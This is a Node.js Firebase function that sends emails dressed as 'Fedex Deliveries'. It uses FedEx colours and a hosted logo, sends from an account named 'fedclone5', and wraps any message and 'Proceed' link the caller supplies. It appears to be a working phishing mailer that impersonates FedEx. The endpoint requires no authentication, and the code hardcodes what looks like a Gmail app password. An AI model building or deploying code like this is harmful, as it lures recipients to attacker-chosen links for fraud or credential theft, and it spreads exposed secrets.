const functions = require("firebase-functions");
const nodemailer = require("nodemailer");
const cors = require("cors")({origin: true});

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "fedclone5@gmail.com",
    pass: "hoei uihb neig povk",
  },
});

exports.sendEmail = functions.https.onRequest((req, res) => {
  cors(req, res, async () => {
    if (req.method !== "POST") {
      return res.status(405).send("Method Not Allowed");
    }

    const {to, message, link} = req.body;

    const html = `
      <div style="font-family: Arial; 
      padding:20px; 
      max-width:600px; 
      margin:auto;">
        
        <div style="text-align:center;">
          <img src="https://res.cloudinary.com/deeqakcdx/image/upload/v1774674824/download_usjv3y.png" width="150" />
        </div>

        <h2 style="color:#4D148C;">Fedex Deliveries</h2>

        <p>${message}</p>

        <div style="margin:20px 0; 
        padding:15px; 
        background:#f5f5f5;">
          <p><b>Click the link below to proceed:</b></p>
          <a href="${link}" style="background:#4D148C;
          color:white;
          padding:12px 18px;
          text-decoration:none;
          border-radius:6px;">
            Proceed
          </a>
        </div>

        <hr/>
        <p>
          Best Regards,<br/>
          <b>Fedex Deliveries</b>
        </p>

      </div>
    `;

    try {
      await transporter.sendMail({
        from: "fedclone5@gmail.com",
        to,
        subject: "Fedex Deliveries",
        html,
      });

      res.status(200).send("Email sent");
    } catch (err) {
      res.status(500).send(err.message);
    }
  });
});
